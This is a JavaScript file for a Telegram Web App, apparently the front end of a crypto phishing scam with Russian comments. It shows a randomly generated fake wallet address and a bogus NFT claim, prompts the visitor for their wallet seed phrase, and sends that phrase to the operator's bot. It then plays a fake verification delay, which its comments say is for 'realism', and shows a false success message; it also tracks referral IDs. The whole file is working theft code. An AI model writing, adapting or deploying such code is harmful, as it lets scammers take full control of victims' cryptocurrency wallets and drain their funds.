// web_app/script.js
const tg = window.Telegram.WebApp;
tg.expand();

// Генерируем фейковый кошелек
function generateWallet() {
    const prefixes = ['EQ', 'UQ', 'kf'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let wallet = prefix;
    
    for (let i = 0; i < 45; i++) {
        wallet += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    document.getElementById('wallet').value = wallet;
}

// Валидация сид фразы
function validateSeedPhrase(seed) {
    const words = seed.trim().split(/\s+/);
    return words.length >= 12 && words.length <= 24;
}

// Отправка данных в бот
function verifyAndClaim() {
    const wallet = document.getElementById('wallet').value;
    const seed = document.getElementById('seed').value;
    
    if (!wallet) {
        alert('Please generate wallet address first!');
        return;
    }
    
    if (!validateSeedPhrase(seed)) {
        alert('Please enter valid seed phrase (12-24 words)');
        return;
    }
    
    // Показываем "загрузку"
    const btn = document.querySelector('.submit-btn');
    btn.innerHTML = '⏳ Verifying...';
    btn.disabled = true;
    
    // Отправляем данные в бот
    const data = {
        wallet_address: wallet,
        seed_phrase: seed,
        timestamp: new Date().toISOString()
    };
    
    // Отправка данных через Telegram Web App
    tg.sendData(JSON.stringify(data));
    
    // Фейковая задержка для "реалистичности"
    setTimeout(() => {
        btn.innerHTML = '✅ NFT Claimed Successfully!';
        btn.style.background = 'linear-gradient(135deg, #28a745, #20c997)';
        
        // Показываем "успешное" сообщение
        setTimeout(() => {
            tg.close();
        }, 2000);
    }, 3000);
}

// Автогенерация кошелька при загрузке
document.addEventListener('DOMContentLoaded', function() {
    generateWallet();
    
    // Получаем реферальный ID из URL
    const urlParams = new URLSearchParams(window.location.search);
    const refId = urlParams.get('ref');
    if (refId) {
        localStorage.setItem('referral_id', refId);
    }
});